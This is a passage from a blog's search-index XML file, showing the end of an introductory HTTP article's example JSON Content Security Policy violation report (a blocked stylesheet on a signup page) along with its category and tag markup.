class="string">&quot;http://example.com/signup.html&quot;</span><span class="punctuation">,</span>    <span class="attr">&quot;effective-directive&quot;</span><span class="punctuation">:</span> <span class="string">&quot;style-src-elem&quot;</span><span class="punctuation">,</span>    <span class="attr">&quot;original-policy&quot;</span><span class="punctuation">:</span> <span class="string">&quot;default-src &#x27;none&#x27;; style-src cdn.example.com; report-to /_/csp-reports&quot;</span><span class="punctuation">,</span>    <span class="attr">&quot;referrer&quot;</span><span class="punctuation">:</span> <span class="string">&quot;&quot;</span><span class="punctuation">,</span>    <span class="attr">&quot;status-code&quot;</span><span class="punctuation">:</span> <span class="number">200</span><span class="punctuation">,</span>    <span class="attr">&quot;violated-directive&quot;</span><span class="punctuation">:</span> <span class="string">&quot;style-src-elem&quot;</span>  <span class="punctuation">&#125;</span><span class="punctuation">&#125;</span></code></pre><hr><h1 id=""><a href="#" class="headerlink" title=""></a></h1>]]></content>
      
      
      <categories>
          
          <category> HTTP </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 入门 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
